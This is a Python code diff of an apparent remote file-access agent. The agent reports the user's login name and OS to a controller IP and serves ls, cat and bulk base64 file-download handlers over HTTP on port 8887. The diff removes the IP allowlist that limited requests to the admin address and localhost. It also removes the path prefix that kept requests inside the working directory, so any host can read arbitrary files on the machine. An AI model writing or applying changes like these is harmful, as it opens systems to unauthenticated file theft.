@@ -1,5 +1,5 @@
 import sys
-from urllib import request, parse
+import requests
 import http.server
 import os
 import platform
@@ -25,9 +25,7 @@ class CobraServer:
         self.url = ip
         self.port = port
     def post_to(self, endpoint, data):
-        data = parse.urlencode(data).encode()
-        req =  request.Request("http://%s:%s/%s.php" % (self.url, self.port, endpoint), data=data)
-        return request.urlopen(req)
+        return requests.post("http://%s:%s/%s.php" % (self.url, self.port, endpoint), data = data)
 
 def ping(server, ip, data = {}):
     return {"status": True}
@@ -37,21 +35,18 @@ def ls(server, ip, data = {}):
         return {"status": True, "body": "[]"}
     if ".." in data["dir"]:
         return {"status": True, "body": "[]"}
-    data["dir"] = os.path.join(".", data["dir"])
     if not os.path.isdir(data["dir"]):
         return {"status": True, "body": "[]"}
     files = []
     for file in os.listdir(data["dir"]):
-        filepath = file.replace("\\", "/")
-        files.append({"name": file, "type": "file" if os.path.isfile(os.path.join(data["dir"], file)) else "dir", "path": data["dir"] + "/" + filepath, "size": os.path.getsize(os.path.join(data["dir"], file))})
+        files.append({"name": file, "type": "file" if os.path.isfile(data["dir"] + "/" + file) else "dir", "path": data["dir"] + "/" + file, "size": os.path.getsize(data["dir"] + "/" + file)})
     return {"status": True, "body": json.dumps(files)}
 
 def cat(server, ip, data = {}):
     if "dir" not in data:
         return {"status": True, "body": ""}
     if ".." in data["dir"]:
-        return {"status": True, "body": "[]"}
-    data["dir"] = os.path.join(".", data["dir"])
+        return {"status": True, "body": ""}
     if not os.path.isfile(data["dir"]):
         return {"status": True, "body": ""}
     if is_binary(data["dir"]):
@@ -67,7 +62,6 @@ def getfiles(server, ip, data = {}):
             if os.path.isfile(file):
                 with open(file, "rb") as f:
                     data = f.read()
-                file = file.replace("\\", "/")
                 file = "/".join(file.split("/")[1:])
                 all_files[file] = base64.b64encode(data).decode("utf-8")
     return {"status": True, "body": json.dumps(all_files)}
@@ -85,10 +79,6 @@ class Handler( http.server.CGIHTTPRequestHandler ):
         pass
     def do_POST(self):
         ip = self.address_string()
-        if ip not in [admin_ip, "127.0.0.1", "::1"]:
-            self.send_response(400)
-            self.end_headers()
-            return
         endpoint = self.path.split("/")[-1]
         if (self.headers['Content-Length']):
             content_length = int(self.headers['Content-Length'])
@@ -112,7 +102,6 @@ class Handler( http.server.CGIHTTPRequestHandler ):
         else:
             self.send_response(404)
         self.end_headers()
-
 if len(sys.argv) != 2:
     print("Usage: %s <ip>" % sys.argv[0])
     exit(1)
@@ -121,12 +110,13 @@ if not sys.argv[1].count(".") != 4:
     print("Invalid IP")
     exit(1)
 
-admin_ip = sys.argv[1]
-
-server = CobraServer(admin_ip)
+server = CobraServer(sys.argv[1])
 if (server.post_to("connect", {"name": os.getlogin(), "port": "8887", "os": platform.system()})):
     print("\033[92mConnected !\033[0m")
 
 server_address = ("", 8887)
 httpd = http.server.HTTPServer(server_address, Handler)
 httpd.serve_forever()
+
+
+
